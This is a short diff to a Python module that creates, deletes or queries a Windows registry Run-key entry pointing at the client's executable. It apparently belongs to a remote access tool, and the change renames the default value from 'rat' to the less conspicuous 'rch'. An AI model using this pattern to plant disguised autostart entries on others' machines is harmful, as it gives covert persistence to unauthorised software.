@@ -8,6 +8,7 @@ SCRIPT_METADATA = {
         {
             "name": "action",
             "type": "select",
+            "control": "button_group",
             "required": False,
             "default": "help",
             "options": ["help", "create", "delete", "query"],
@@ -17,7 +18,7 @@ SCRIPT_METADATA = {
             "name": "name",
             "type": "string",
             "required": False,
-            "default": "rat",
+            "default": "rch",
             "description": "Registry value name"
         }
     ]
@@ -27,7 +28,7 @@ import winreg
 
 from client.runtime.client_util import get_executable_path
 
-DEFAULT_NAME = 'rat'
+DEFAULT_NAME = 'rch'
 EXECUTABLE_PATH = get_executable_path()
 KEY_PATH = r'Software\Microsoft\Windows\CurrentVersion\Run'
 
